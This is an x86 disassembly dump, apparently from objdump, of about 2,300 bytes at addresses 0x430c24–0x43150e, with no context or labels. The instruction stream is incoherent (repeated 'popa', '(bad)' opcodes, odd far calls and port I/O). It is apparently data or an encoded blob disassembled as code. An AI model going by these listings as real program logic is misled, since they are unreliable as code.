  430c24:	or     eax,0x616850db
  430c29:	popa   
  430c2a:	or     eax,0x625c0813
  430c2f:	bound  edx,QWORD PTR [ebx]
  430c31:	test   DWORD PTR [edi+edx*1],0x625cade2
  430c38:	bound  ecx,QWORD PTR ds:0x625cade2
  430c3e:	bound  ecx,QWORD PTR ds:0xe7130d61
  430c44:	bound  esp,QWORD PTR [edx+0x62]
  430c47:	or     eax,0x6168df17
  430c4c:	popa   
  430c4d:	or     eax,0xd685661
  430c52:	adc    ebp,DWORD PTR [ebp+0xd62625c]
  430c58:	xchg   ecx,eax
  430c59:	pop    ss
  430c5a:	push   0x61fb2257
  430c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430c60:	or     eax,0xc664d864
  430c65:	and    DWORD PTR [ebp+0x55],esi
  430c68:	lods   eax,DWORD PTR ds:[esi]
  430c69:	loop   0x430c6c
  430c6b:	imul   esp,DWORD PTR [ecx],0xe2256975
  430c71:	add    DWORD PTR [ecx+0xd],ebp
  430c74:	jne    0x430c10
  430c76:	or     eax,0x6fd655cd
  430c7b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430c81:	pop    esi
  430c82:	call   0x1fea6e2f
  430c87:	mov    dl,0x8b
  430c89:	or     eax,0xb855575
  430c8e:	call   0xa8e8:0x5e343ac9
  430c95:	popa   
  430c96:	lock aad 0x5f
  430c99:	popa   
  430c9a:	popa   
  430c9b:	lock (bad) 
  430c9d:	pop    edi
  430c9e:	popa   
  430c9f:	popa   
  430ca0:	or     eax,0xcd0d8675
  430ca5:	push   ebp
  430ca6:	(bad)  
  430ca7:	outs   dx,DWORD PTR ds:[esi]
  430ca8:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430cae:	pop    esi
  430caf:	call   0x1fea6e5c
  430cb4:	xchg   ebx,eax
  430cb5:	outs   dx,BYTE PTR ds:[esi]
  430cb6:	icebp  
  430cb7:	push   0x750d6161
  430cbc:	xchg   edx,eax
  430cbd:	pop    ss
  430cbe:	jne    0x430cc8
  430cc0:	or     eax,0x75178675
  430cc5:	adc    al,0xd
  430cc7:	jne    0x430c63
  430cc9:	pop    ss
  430cca:	jne    0x430cec
  430ccc:	and    DWORD PTR [ebp-0xd],esi
  430ccf:	add    ah,dl
  430cd1:	add    DWORD PTR [ecx+0x21],ebp
  430cd4:	jne    0x430d07
  430cd6:	and    esp,edx
  430cd8:	add    DWORD PTR [ecx+0x21],ebp
  430cdb:	jne    0x430d25
  430cdd:	lods   eax,DWORD PTR ds:[esi]
  430cde:	loop   0x430ce1
  430ce0:	imul   esp,DWORD PTR [ecx],0xe2253c75
  430ce6:	add    DWORD PTR [ecx+0x21],ebp
  430ce9:	jne    0x430d48
  430ceb:	mov    bl,0xe2
  430ced:	add    DWORD PTR [ecx+0xd],ebp
  430cf0:	jne    0x430d2e
  430cf2:	test   DWORD PTR [ebx],ecx
  430cf4:	call   0xa8e8:0x5e343ac9
  430cfb:	popa   
  430cfc:	or     eax,0x602d14cd
  430d01:	pop    ss
  430d02:	int    0x64
  430d04:	and    DWORD PTR [ebp+0x18],esi
  430d07:	sub    edx,esp
  430d09:	add    DWORD PTR [ecx-0x2a],ebp
  430d0c:	jmp    0x9369:0x1e2ad5d
  430d13:	outs   dx,BYTE PTR ds:[esi]
  430d14:	sbb    ch,BYTE PTR [eax+0x61]
  430d17:	popa   
  430d18:	or     eax,0xb853c75
  430d1d:	call   0xd63c:0xcd0d3ac9
  430d24:	outs   dx,DWORD PTR ds:[esi]
  430d25:	or     ebx,DWORD PTR [edx+0x10133ac9]
  430d2b:	call   0x750d:0x61ce1b4b
  430d32:	fs scas eax,DWORD PTR es:[edi]
  430d34:	inc    esi
  430d35:	dec    edx
  430d36:	outs   dx,DWORD PTR ds:[esi]
  430d37:	or     eax,0xb855d75
  430d3c:	call   0xa8e8:0x5e343ac9
  430d43:	popa   
  430d44:	or     eax,0x6fd63ccd
  430d49:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430d4f:	pop    esi
  430d50:	call   0x1f706efd
  430d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d56:	pop    eax
  430d57:	xchg   ebx,eax
  430d58:	loop   0x430dab
  430d5a:	popa   
  430d5b:	popa   
  430d5c:	popa   
  430d5d:	or     eax,0x75562075
  430d62:	sbb    ah,BYTE PTR fs:[ecx+0x4]
  430d66:	jne    0x430d89
  430d68:	or     eax,0xb854875
  430d6d:	call   0xa8e8:0x5e343ac9
  430d74:	popa   
  430d75:	pop    ss
  430d76:	jne    0x430d94
  430d78:	out    dx,al
  430d79:	cmp    cl,BYTE PTR ds:0x17a21c75
  430d7f:	jne    0x430d9d
  430d81:	or     eax,0xb851875
  430d86:	call   0xa8e8:0x5e343ac9
  430d8d:	popa   
  430d8e:	mov    eax,ds:0xd2731c75
  430d93:	or     eax,0x5e331c75
  430d98:	call   0xbc86f45
  430d9d:	call   0xa550:0x66343ac9
  430da4:	fmul   QWORD PTR ds:0x2c171ccd
  430daa:	adc    esp,DWORD PTR [eax+0xd]
  430dad:	jne    0x430dcb
  430daf:	(bad)  
  430db0:	(bad)  
  430db2:	pusha  
  430db3:	cld    
  430db4:	dec    ebp
  430db5:	int3   
  430db6:	mov    es,ebp
  430db8:	imul   ecx,DWORD PTR ds:0x2c0d1c75,0xffffffe2
  430dbf:	pusha  
  430dc0:	xor    al,0x3c
  430dc2:	push   ebp
  430dc3:	xor    al,0xf7
  430dc5:	or     eax,0x2c171ccd
  430dca:	adc    esp,DWORD PTR [eax-0x12]
  430dcd:	(bad)  
  430dce:	or     eax,0x2c0d1c75
  430dd3:	loop   0x430e35
  430dd5:	xor    edi,DWORD PTR [eax+eiz*1]
  430dd8:	rcr    BYTE PTR [edi+0xd],cl
  430ddb:	int    0x1c
  430ddd:	pop    ss
  430dde:	sub    al,0x13
  430de0:	pusha  
  430de1:	out    dx,al
  430de2:	adc    eax,ebx
  430de4:	jmp    0x693:0x89b26108
  430deb:	jne    0x430e0e
  430ded:	test   eax,ebx
  430def:	popa   
  430df0:	popa   
  430df1:	popa   
  430df2:	fcomp  DWORD PTR [edx+ebx*4]
  430df5:	add    al,0x75
  430df7:	and    esi,ebp
  430df9:	xor    ecx,DWORD PTR ds:0xb85f375
  430dff:	call   0xa8e8:0x5e343ac9
  430e06:	popa   
  430e07:	xchg   ebx,eax
  430e08:	push   es
  430e09:	int    0x21
  430e0b:	sub    eax,0x21cd0460
  430e10:	or     eax,0x6fd631cd
  430e15:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430e1b:	pop    esi
  430e1c:	call   0x755d6fc9
  430e21:	and    DWORD PTR [esi+0x60],eax
  430e24:	add    al,0x75
  430e26:	and    DWORD PTR [edi+0x20750d1c],ebp
  430e2c:	push   esi
  430e2d:	jne    0x430e93
  430e2f:	sbb    cl,ch
  430e31:	and    DWORD PTR [edx+ebx*4],eax
  430e34:	or     eax,0x5e336475
  430e39:	call   0xbc86fe6
  430e3e:	call   0xb248:0x75a73ac9
  430e45:	cwde   
  430e46:	or     eax,0xb855d75
  430e4b:	call   0xa8e8:0x5e343ac9
  430e52:	popa   
  430e53:	or     eax,0x6fd63ccd
  430e58:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430e5e:	pop    esi
  430e5f:	call   0x1f70700c
  430e64:	xor    ebx,DWORD PTR [esi-0x18]
  430e67:	test   al,0x61
  430e69:	test   DWORD PTR [ebx],ecx
  430e6b:	call   0xd5d:0x75173ac9
  430e72:	jne    0x430eb0
  430e74:	test   DWORD PTR [ebx],ecx
  430e76:	call   0xa8e8:0x5e343ac9
  430e7d:	popa   
  430e7e:	or     eax,0x602d14cd
  430e83:	pop    ss
  430e84:	int    0x64
  430e86:	out    dx,al
  430e87:	imul   ecx,DWORD PTR ds:0xb853c75,0xffffff9a
  430e8e:	leave  
  430e8f:	cmp    dh,BYTE PTR [esi+ebx*2]
  430e92:	call   0xcd50703f
  430e97:	fs sub eax,0x64cd1760
  430e9d:	lock in eax,0x63
  430ea0:	bound  esp,QWORD PTR [edx-0x12]
  430ea3:	xchg   ebx,eax
  430ea4:	or     eax,0xb855575
  430ea9:	call   0xa8e8:0x5e343ac9
  430eb0:	popa   
  430eb1:	out    dx,al
  430eb2:	lea    ecx,ds:0xb856975
  430eb8:	call   0xa8e8:0x5e343ac9
  430ebf:	popa   
  430ec0:	push   edi
  430ec1:	and    al,BYTE PTR [esi-0x305b349f]
  430ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430ec8:	or     eax,0x8e750d64
  430ecd:	push   0x55d23875
  430ed2:	or     eax,0xb2688ab2
  430ed7:	jbe    0x430e7d
  430ed9:	or     eax,0x12ac7eb2
  430ede:	enter  0xcc1a,0x63
  430ee2:	fsub   DWORD PTR [eax+0x62]
  430ee5:	inc    ebp
  430ee6:	dec    eax
  430ee7:	dec    edx
  430ee8:	pop    eax
  430ee9:	rcr    BYTE PTR [edx],cl
  430eeb:	push   edx
  430eec:	fsub   DWORD PTR [eax+0x62]
  430eef:	inc    ebp
  430ef0:	dec    eax
  430ef1:	dec    edx
  430ef2:	pop    eax
  430ef3:	rcr    BYTE PTR [edi+0x4e],cl
  430ef6:	or     eax,0x8664d863
  430efb:	sub    eax,0xd2d2a21c
  430f00:	rcl    dl,cl
  430f02:	ror    bl,cl
  430f04:	sub    eax,0x4dd8a44b
  430f09:	bound  edx,QWORD PTR [ecx+eiz*2]
  430f0c:	push   esi
  430f0d:	popa   
  430f0e:	popa   
  430f0f:	inc    ebp
  430f10:	dec    eax
  430f11:	adc    eax,DWORD PTR [esp+eax*4]
  430f14:	cmp    ah,BYTE PTR [ecx+0x61]
  430f17:	adc    al,0x61
  430f19:	mul    DWORD PTR [ecx-0x9]
  430f1c:	dec    edi
  430f1d:	lock gs scas al,BYTE PTR es:[edi]
  430f20:	jo     0x430f56
  430f22:	shl    ebx,0x16
  430f25:	pop    edi
  430f26:	popa   
  430f27:	popa   
  430f28:	xor    BYTE PTR ss:[ebx],dl
  430f2b:	test   BYTE PTR [ebx],dl
  430f2d:	mov    ds:0xd55ea0d,eax
  430f32:	jne    0x430f65
  430f34:	sub    eax,0x217f8eea
  430f39:	pop    ss
  430f3a:	jne    0x430f2f
  430f3c:	lods   eax,DWORD PTR ds:[esi]
  430f3d:	popa   
  430f3e:	repz xor eax,0x9361615f
  430f44:	loop   0x430f2a
  430f46:	popa   
  430f47:	popa   
  430f48:	popa   
  430f49:	sbb    cl,ch
  430f4b:	pop    ebp
  430f4c:	jg     0x430f38
  430f4e:	fs inc ebp
  430f50:	ret    0xf0db
  430f53:	call   0x56ca:0xed45474b
  430f5a:	arpl   WORD PTR [ebx+edx*1-0x3de0236a],di
  430f61:	call   0xdd10:0x13c03a96
  430f68:	out    0x8c,al
  430f6a:	popa   
  430f6b:	popa   
  430f6c:	leave  
  430f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430f6e:	push   ds
  430f6f:	popa   
  430f70:	push   0xadd26161
  430f75:	push   0xea0d9ee8
  430f7a:	push   ebp
  430f7b:	sub    eax,0x6933cea
  430f80:	mov    ds:0x4f4c710d,eax
  430f85:	ret    0x520d
  430f88:	jg     0x430fd4
  430f8a:	push   esi
  430f8b:	push   edx
  430f8c:	adc    esp,esi
  430f8e:	int    0x61
  430f90:	rep lods eax,DWORD PTR ds:[esi]
  430f92:	pop    edi
  430f93:	popa   
  430f94:	popa   
  430f95:	or     eax,0x9aed1f60
  430f9a:	fdivr  DWORD PTR [edi]
  430f9c:	push   0x611e6fa7
  430fa1:	push   0x8cb26161
  430fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430fa7:	(bad)  
  430fa8:	call   0xdc1fdfe
  430fad:	jno    0x430ffb
  430faf:	maxss  xmm4,DWORD PTR [ecx+0x61]
  430fb4:	mov    ds:0x68f3d874,al
  430fb9:	fsubr  st,st(5)
  430fbb:	push   0x64e8ffa7
  430fc0:	rcr    BYTE PTR [eax-0x2fcb9828],0xd
  430fc7:	dec    esi
  430fc8:	call   0x681ba860
  430fcd:	xchg   edi,eax
  430fce:	shr    BYTE PTR [edi],1
  430fd0:	mul    DWORD PTR [ebx+0x57]
  430fd3:	call   0x637d3fcf
  430fd8:	push   edi
  430fd9:	sub    eax,0xd3eec84f
  430fde:	lods   eax,DWORD PTR ds:[esi]
  430fdf:	pop    ds
  430fe0:	arpl   WORD PTR [eax-0xd],sp
  430fe3:	rcr    DWORD PTR [edi+0x61],cl
  430fe6:	popa   
  430fe7:	mov    dl,0x7e
  430fe9:	retf   0xc0c3
  430fec:	rol    eax,0xc1
  430fef:	bound  ebx,QWORD PTR [esi+0x2ac8c98e]
  430ff5:	into   
  430ff6:	cmp    esp,DWORD PTR [ecx+0x61]
  430ff9:	das    
  430ffa:	popa   
  430ffb:	out    dx,al
  430ffc:	jae    0x430fab
  430ffe:	push   ebx
  430fff:	arpl   WORD PTR [eax-0xd],sp
  431002:	jb     0x431063
  431004:	popa   
  431005:	popa   
  431006:	mov    dl,0x32
  431008:	lods   eax,DWORD PTR ds:[esi]
  431009:	outs   dx,DWORD PTR ds:[esi]
  43100a:	arpl   WORD PTR [eax-0xd],sp
  43100d:	imul   ebx,DWORD PTR [edi+0x61],0x61
  431011:	mov    dl,0xcf
  431013:	retf   0x3a96
  431016:	lods   eax,DWORD PTR ds:[esi]
  431017:	xchg   ecx,eax
  431018:	call   0xd2dabd7c
  43101d:	or     eax,0xb22d55b2
  431022:	cmp    al,0xa7
  431024:	mov    dl,0x8e
  431026:	xchg   ebx,eax
  431027:	(bad)  [edi+0x68]
  43102a:	popa   
  43102b:	popa   
  43102c:	mov    cl,0xd
  43102e:	jmp    0x6168:0xef0bb55
  431035:	popa   
  431036:	lods   eax,DWORD PTR ds:[esi]
  431037:	push   eax
  431038:	repz xor BYTE PTR [eax+0x61],ch
  43103c:	popa   
  43103d:	or     eax,0x87e750b2
  431042:	lods   eax,DWORD PTR ds:[esi]
  431043:	sbb    bl,dh
  431045:	in     al,dx
  431046:	push   0xb20d6161
  43104b:	sub    bh,ah
  43104d:	xchg   ecx,eax
  43104e:	or     eax,0xcd0d58b2
  431053:	sub    BYTE PTR [edi],dl
  431055:	int    0x58
  431057:	or     eax,0xcd1750cd
  43105c:	sub    BYTE PTR ds:0xcd173ccd,cl
  431062:	push   eax
  431063:	pop    ss
  431064:	mov    dl,0x3c
  431066:	retf   0xc1c3
  431069:	sub    bh,BYTE PTR [edx-0x70]
  43106c:	popa   
  43106d:	popa   
  43106e:	das    
  43106f:	call   0x3a96:0xcbc85156
  431076:	sbb    bl,BYTE PTR [edi]
  431078:	call   0xd29a07dc
  43107d:	or     eax,0x1ef34c71
  431082:	push   0x7eb26161
  431087:	or     eax,0xea0df375
  43108c:	dec    esp
  43108d:	pop    ds
  43108e:	dec    eax
  43108f:	push   esi
  431090:	sub    eax,0xbc9a7057
  431095:	adc    ebx,edi
  431097:	fwait
  431098:	imul   esi
  43109a:	test   DWORD PTR ds:0xf4d84c71,ecx
  4310a0:	pop    edi
  4310a1:	repz cld 
  4310a3:	push   0x8ab26161
  4310a8:	or     eax,0xea0df375
  4310ad:	dec    esp
  4310ae:	pop    ds
  4310af:	dec    eax
  4310b0:	push   esi
  4310b1:	jo     0x43104d
  4310b3:	shl    DWORD PTR [eax-0x66],0xbc
  4310b7:	adc    esp,DWORD PTR [eax]
  4310b9:	fwait
  4310ba:	imul   DWORD PTR [eax+0x61]
  4310bd:	popa   
  4310be:	out    dx,al
  4310bf:	xchg   edx,eax
  4310c0:	sub    edi,esi
  4310c2:	pop    edi
  4310c3:	popa   
  4310c4:	popa   
  4310c5:	push   esi
  4310c6:	jmp    0x611e:0xc192704c
  4310cd:	push   0xcd176161
  4310d2:	sbb    BYTE PTR ds:0xfa0da21c,ch
  4310d8:	repz jp 0x431143
  4310db:	popa   
  4310dc:	popa   
  4310dd:	or     eax,0xe8522d60
  4310e2:	gs push 0xead818cd
  4310e8:	stc    
  4310e9:	not    DWORD PTR [ebx+0x6161add8]
  4310ef:	popa   
  4310f0:	fdiv   DWORD PTR [ebp-0x7]
  4310f3:	cmp    cl,BYTE PTR ds:0x30d818cd
  4310f9:	imul   eax
  4310fb:	push   esi
  4310fc:	jo     0x431154
  4310fe:	ror    DWORD PTR ds:0x3f1f60ea,0x3b
  431105:	sub    eax,0xa270a21c
  43110a:	mov    esp,0x40d32013
  43110f:	push   esi
  431110:	popa   
  431111:	popa   
  431112:	or     eax,0x68a6f3fa
  431117:	popa   
  431118:	popa   
  431119:	or     eax,0xe8522d60
  43111e:	gs pop ss
  431120:	int    0xf3
  431122:	pop    ss
  431123:	int    0x3c
  431125:	fdiv   DWORD PTR [eax]
  431127:	imul   eax
  431129:	jae    0x431138
  43112b:	outs   dx,DWORD PTR ds:[esi]
  43112c:	fcom   DWORD PTR [ebp-0x12b097c4]
  431132:	fmul   st,st(5)
  431134:	cmp    al,0x5f
  431136:	int3   
  431137:	fdiv   DWORD PTR [eax]
  431139:	mov    WORD PTR [ebx-0x7f],?
  43113c:	adc    al,0xba
  43113e:	pop    edi
  43113f:	popa   
  431140:	popa   
  431141:	sub    eax,0x46520d1f
  431146:	xchg   ebp,eax
  431147:	cmp    al,0x56
  431149:	jne    0x431187
  43114b:	dec    edi
  43114c:	dec    eax
  43114d:	push   esi
  43114e:	jne    0x4311b0
  431150:	pop    ss
  431151:	jne    0x43119f
  431153:	out    dx,al
  431154:	xor    ebx,eax
  431156:	in     eax,dx
  431157:	div    ebx
  431159:	pop    ebx
  43115a:	popa   
  43115b:	popa   
  43115c:	popa   
  43115d:	dec    edi
  43115e:	out    dx,al
  43115f:	dec    edi
  431160:	xchg   ebp,eax
  431161:	cmp    al,0xa1
  431163:	mov    ebp,0x623be848
  431168:	jne    0x4311a6
  43116a:	aaa    
  43116b:	mov    ebp,0xf3b2cc48
  431170:	adc    al,0x2c
  431172:	cmp    esp,DWORD PTR [ecx+0x61]
  431175:	push   esi
  431176:	jne    0x4311d8
  431178:	pop    ss
  431179:	jne    0x4311c7
  43117b:	pop    ds
  43117c:	xchg   ebp,eax
  43117d:	cmp    al,0xf7
  43117f:	jo     0x431178
  431181:	mov    esp,0xd9b622d
  431186:	and    DWORD PTR ds:0x6f34c71,ecx
  43118c:	popa   
  43118d:	popa   
  43118e:	popa   
  43118f:	and    al,0x68
  431191:	out    0x56,eax
  431193:	xchg   ecx,eax
  431194:	jmp    0x64b2:0xccc24f3c
  43119b:	out    dx,al
  43119c:	popa   
  43119d:	bound  esi,QWORD PTR [ebp+0x3c]
  4311a0:	or     eax,0x1fd818cd
  4311a5:	pop    edi
  4311a6:	or     eax,0x210d55ea
  4311ab:	sub    eax,0x75a18e75
  4311b0:	cmp    al,0xc4
  4311b2:	ror    BYTE PTR ds:0x3cb22d4a,1
  4311b8:	or     eax,0xbbb138a5
  4311bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4311be:	addr16 jae 0x431217
  4311c1:	shl    DWORD PTR [edx+0x55ea174a],1
  4311c7:	xchg   ebx,eax
  4311c8:	push   es
  4311c9:	xor    DWORD PTR [edi-0x266cc716],esp
  4311cf:	(bad)  
  4311d0:	pop    esp
  4311d1:	bound  esp,QWORD PTR [edx-0xd]
  4311d4:	cs popa 
  4311d6:	popa   
  4311d7:	popa   
  4311d8:	sub    eax,0x8ee6131c
  4311dd:	xchg   esi,eax
  4311de:	or     eax,0xb20dfba5
  4311e3:	imul   ebp,DWORD PTR ds:0xa8178ab2,0xda6a50d
  4311ed:	jmp    0xa017:0x8eea2d55
  4311f4:	push   edi
  4311f5:	(bad)  
  4311f6:	mov    esp,0x617622c3
  4311fb:	mov    esp,0xa21c2dca
  431200:	out    dx,al
  431201:	push   eax
  431202:	(bad)  
  431203:	pop    esi
  431204:	popa   
  431205:	popa   
  431206:	popa   
  431207:	push   0x1f1568e8
  43120c:	xor    eax,0xb20da49a
  431211:	imul   esp,DWORD PTR [edi+0x187376b2],0x1f48750d
  43121b:	dec    eax
  43121c:	call   0xb217:0x487517b1
  431223:	imul   edi,DWORD PTR [ebp+edx*1-0x6c0632f3],0x3f1f1c06
  43122e:	not    DWORD PTR [esi+0x75]
  431231:	repz push esi
  431233:	pop    ds
  431234:	out    dx,al
  431235:	cmp    edx,DWORD PTR [ebx+0x75561c06]
  43123b:	stc    
  43123c:	or     eax,0xe6136071
  431241:	jne    0x4312a4
  431243:	sub    eax,0x75e6131c
  431248:	popa   
  431249:	(bad)  
  43124a:	pop    esi
  43124b:	popa   
  43124c:	popa   
  43124d:	popa   
  43124e:	push   0xc60d7673
  431253:	mov    gs,WORD PTR [edx-0x47131e1]
  431259:	call   0x173:0xb68ec6a7
  431260:	sbb    cl,BYTE PTR [ecx-0x5571d39e]
  431266:	pop    ds
  431267:	xor    eax,0x8ebe049a
  43126c:	sti    
  43126d:	or     eax,0xa5f2934d
  431272:	popa   
  431273:	pop    ds
  431274:	lock xchg edi,eax
  431276:	xchg   ebx,eax
  431277:	mov    edx,0x8ec6a14e
  43127c:	sti    
  43127d:	jae    0x43120a
  43127f:	or     eax,0x9a612747
  431284:	popa   
  431285:	popa   
  431286:	sub    eax,0x34f01f4e
  43128b:	xchg   esp,eax
  43128c:	push   0x1c5661cd
  431291:	adc    esp,esi
  431293:	mov    fs,WORD PTR [edx+0x34f11f15]
  431299:	aaa    
  43129a:	(bad)  
  43129b:	mov    ?,ebx
  43129d:	sub    eax,0xa5379447
  4312a2:	popa   
  4312a3:	push   esi
  4312a4:	sbb    al,0xd8
  4312a6:	sbb    al,0x68
  4312a8:	adc    esp,esi
  4312aa:	mov    fs,WORD PTR [edx+0x640da515]
  4312b0:	(bad)  
  4312b1:	mov    fs:0xa461615f,al
  4312b7:	retf   
  4312b8:	and    edx,esp
  4312ba:	jp     0x43131e
  4312bc:	bound  esp,QWORD PTR [edx-0x53]
  4312bf:	loop   0x4312c2
  4312c1:	imul   esp,DWORD PTR [ecx],0x626240e2
  4312c7:	bound  esp,QWORD PTR ds:0xd6901e2
  4312cd:	jne    0x431269
  4312cf:	pop    ss
  4312d0:	jne    0x4312f6
  4312d2:	or     eax,0x62627ae2
  4312d7:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4312dd:	xor    al,0x5e
  4312df:	call   0xe25a748c
  4312e4:	into   
  4312e5:	bound  esp,QWORD PTR [edx+0x62]
  4312e8:	or     eax,0x62627ae2
  4312ed:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4312f3:	xor    al,0x5e
  4312f5:	call   0x755a74a2
  4312fa:	pop    ebp
  4312fb:	or     eax,0x62627ae2
  431300:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431306:	xor    al,0x5e
  431308:	call   0x755a74b5
  43130d:	adc    al,0xd
  43130f:	loop   0x43138b
  431311:	bound  esp,QWORD PTR [edx+0x62]
  431314:	test   DWORD PTR [ebx],ecx
  431316:	call   0xa8e8:0x5e343ac9
  43131d:	popa   
  43131e:	pop    ss
  43131f:	jne    0x431341
  431321:	and    DWORD PTR [ebp+0x1c],esi
  431324:	lods   eax,DWORD PTR ds:[esi]
  431325:	xor    al,0x9
  431327:	imul   esp,DWORD PTR [ecx],0x6262e6e2
  43132d:	bound  ebp,QWORD PTR [ebp+0x2169010b]
  431333:	jne    0x4312e2
  431335:	and    dl,ah
  431337:	add    DWORD PTR [ecx+0x21],ebp
  43133a:	jne    0x431335
  43133c:	aam    0x61
  43133e:	popa   
  43133f:	popa   
  431340:	and    edx,esp
  431342:	jmp    0x4313a6
  431344:	bound  esp,QWORD PTR [edx-0x2c]
  431347:	popa   
  431348:	popa   
  431349:	popa   
  43134a:	and    DWORD PTR [ebp+0x69],esi
  43134d:	xchg   esp,eax
  43134e:	popa   
  43134f:	popa   
  431350:	popa   
  431351:	and    edx,esp
  431353:	out    0x62,eax
  431355:	bound  esp,QWORD PTR [edx-0x6c]
  431358:	popa   
  431359:	popa   
  43135a:	popa   
  43135b:	and    DWORD PTR [ebp+0x31],esi
  43135e:	int3   
  43135f:	popa   
  431360:	popa   
  431361:	popa   
  431362:	and    edx,esp
  431364:	fbld   TBYTE PTR [edx+0x62]
  431367:	bound  ebp,QWORD PTR [ecx+eiz*2]
  43136a:	popa   
  43136b:	popa   
  43136c:	or     eax,0x62627ae2
  431371:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431377:	xor    al,0x5e
  431379:	call   0x755a7526
  43137e:	dec    esp
  43137f:	or     eax,0x62627ae2
  431384:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43138a:	xor    al,0x5e
  43138c:	call   0xe25a7539
  431391:	jecxz  0x4313f5
  431393:	bound  esp,QWORD PTR [edx-0x28]
  431396:	pop    ebx
  431397:	mov    dh,0x62
  431399:	bound  esp,QWORD PTR [edx+0x61]
  43139c:	out    dx,al
  43139d:	lea    ecx,ds:0x6262b6e2
  4313a3:	bound  esp,QWORD PTR [edx+0x62b6e217]
  4313a9:	bound  esp,QWORD PTR [edx-0x2a]
  4313ac:	and    esi,DWORD PTR [esi-0x359d9d9e]
  4313b2:	pop    edi
  4313b3:	popa   
  4313b4:	popa   
  4313b5:	jae    0x43135b
  4313b7:	fcomp  DWORD PTR [ebx-0x36]
  4313ba:	bound  esp,QWORD PTR [edx+0x62]
  4313bd:	popa   
  4313be:	out    dx,al
  4313bf:	lea    ecx,ds:0x6262cae2
  4313c5:	bound  esp,QWORD PTR [edx+0x62cae217]
  4313cb:	bound  esp,QWORD PTR [edx-0x28]
  4313ce:	and    ecx,edx
  4313d0:	bound  esp,QWORD PTR [edx+0x62]
  4313d3:	test   BYTE PTR [ebx-0x7b],dh
  4313d6:	fcomp  DWORD PTR [ebx-0x42]
  4313d9:	bound  esp,QWORD PTR [edx+0x62]
  4313dc:	popa   
  4313dd:	out    dx,al
  4313de:	lea    ecx,ds:0x6262bee2
  4313e4:	bound  esp,QWORD PTR [edx+0x62bee217]
  4313ea:	bound  esp,QWORD PTR [edx-0x28]
  4313ed:	and    edi,DWORD PTR [esi-0x1e9d9d9e]
  4313f3:	jae    0x431473
  4313f5:	adc    esi,DWORD PTR [ebp-0x25]
  4313f8:	rcl    BYTE PTR [ebx],cl
  4313fa:	jne    0x431454
  4313fc:	sar    BYTE PTR [edx+0x52],cl
  4313ff:	addr16 loop 0x43146b
  431402:	repz cld 
  431404:	js     0x431467
  431406:	popa   
  431407:	out    dx,al
  431408:	es out dx,al
  43140a:	or     ebp,esi
  43140c:	mov    ebp,db6
  43140f:	std    
  431410:	mov    WORD PTR [edx-0x1df29e9f],fs
  431416:	jp     0x43147a
  431418:	bound  esp,QWORD PTR [edx-0x7b]
  43141b:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  431421:	call   0x755a75ce
  431426:	pusha  
  431427:	or     eax,0x62627ae2
  43142c:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431432:	xor    al,0x5e
  431434:	call   0x755a75e1
  431439:	push   esp
  43143a:	fcom   DWORD PTR [ebp-0x7319e4f]
  431440:	mov    ah,BYTE PTR [ecx+0x61]
  431443:	popa   
  431444:	pop    ss
  431445:	jne    0x4313f8
  431447:	or     eax,0xa20db175
  43144c:	jb     0x431465
  43144e:	jne    0x431458
  431450:	or     eax,0xa20d0875
  431455:	xchg   BYTE PTR [edi],dl
  431457:	jne    0x4314ae
  431459:	or     eax,0xcd132475
  43145e:	mov    cl,0x17
  431460:	add    al,0xfd
  431462:	push   0x750d6161
  431467:	and    al,0x13
  431469:	int    0x8
  43146b:	pop    ss
  43146c:	add    al,0x54
  43146e:	push   0x750d6161
  431473:	and    al,0x13
  431475:	int    0x55
  431477:	pop    ss
  431478:	add    al,0x24
  43147a:	push   0xb0d6161
  43147f:	jp     0x4314e3
  431481:	bound  esp,QWORD PTR [edx-0x2a]
  431484:	dec    ebx
  431485:	or     ebx,DWORD PTR [edx-0x29c537]
  43148b:	pop    esi
  43148c:	call   0xb2a57639
  431491:	and    al,0xf3
  431493:	mov    ebx,edx
  431495:	popa   
  431496:	popa   
  431497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431498:	xor    DWORD PTR [ebx+0x6134826e],edx
  43149e:	popa   
  43149f:	or     eax,0xdb0d2475
  4314a4:	jmp    0xda47611
  4314a9:	int    0x24
  4314ab:	or     eax,0x6168e917
  4314b0:	popa   
  4314b1:	or     eax,0x56610d91
  4314b6:	cdq    
  4314b7:	xchg   esi,eax
  4314b8:	pop    ss
  4314b9:	loop   0x4314b2
  4314bb:	bound  esp,QWORD PTR [edx+0x62]
  4314be:	adc    esp,edx
  4314c0:	call   0xf770:0xd2626262
  4314c7:	or     eax,0x6262f7e2
  4314cc:	bound  esp,QWORD PTR [edx-0x53]
  4314cf:	adc    BYTE PTR [ecx+0x61],ah
  4314d2:	popa   
  4314d3:	or     eax,0xdb0d2475
  4314d8:	adc    BYTE PTR [eax+0x61],ch
  4314db:	popa   
  4314dc:	or     eax,0xf7130d61
  4314e1:	bound  esp,QWORD PTR [edx+0x62]
  4314e4:	push   esi
  4314e5:	(bad)  
  4314e6:	add    al,0x61
  4314e8:	popa   
  4314e9:	popa   
  4314ea:	ror    BYTE PTR ds:0xdb0d2475,cl
  4314f0:	dec    eax
  4314f1:	push   0xd2626161
  4314f6:	jbe    0x4314f7
  4314f8:	loop   0x431480
  4314fa:	bound  esp,QWORD PTR [edx+0x62]
  4314fd:	ret    0xe2ff
  431500:	lea    esp,[edx+0x62]
  431503:	(bad)  {k2}{z}
  431508:	bound  esp,QWORD PTR [edx+0x62]
  43150b:	cli    
  43150c:	jmp    edx
  43150e:	xchg   ebx,eax
